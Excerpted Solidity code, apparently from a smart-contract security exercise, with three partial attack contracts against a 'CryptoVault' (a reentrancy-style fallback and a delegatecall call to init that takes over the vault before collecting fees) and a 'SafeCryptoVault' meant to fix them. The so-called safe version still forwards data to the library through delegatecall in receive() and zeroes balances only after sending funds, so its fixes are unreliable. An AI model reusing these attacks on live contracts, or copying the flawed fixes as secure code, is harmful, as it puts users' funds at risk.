...
contract attack1 {
    CryptoVault vulnerableContract;

    constructor(address payable addr) public { 
        vulnerableContract = CryptoVault(addr);
    }
...
contract attack2 {
    ...
    constructor(address payable addr) public {
        vulnerableContract = CryptoVault(addr);
        vulnerableContractAddress = addr;
    }

    fallback() external payable{
        if(msg.value <= address(vulnerableContractAddress).balance){
...
contract attack3 {
    ...
    function attack() public {
        vulnerableContractAddress.call(abi.encodeWithSignature("init(address)",this));
        vulnerableContract.collectFees();
    }
}
...
contract SafeCryptoVault {
    ...
    // in this vault.
    function withdraw(uint _amount) public {
        require (accounts[msg.sender] > _amount, "Insufficient funds"); //No underflow vulnerability
        accounts[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send funds");
    }
    ...
    function withdrawAll() public {
        ...
        uint amount = accounts[msg.sender];
        require (amount > 0, "Insufficient funds");
        lock = true;//By locking the contract we prevent reentrancy vulnerabilities
        (bool sent, ) = msg.sender.call{value: amount}("");
        lock = false;
        require(sent, "Failed to send funds");
        accounts[msg.sender] = 0;
    ...
    // functions. 
    fallback () external payable {
        revert("Calling a non-existent function!");//No delegateCall vulnerability
        //The init function from the Lib can't be called anymore with a fallback
    }
    receive () external payable {
        (bool success,) = tLib.delegatecall(msg.data);
        require(success,"delegatecall failed");
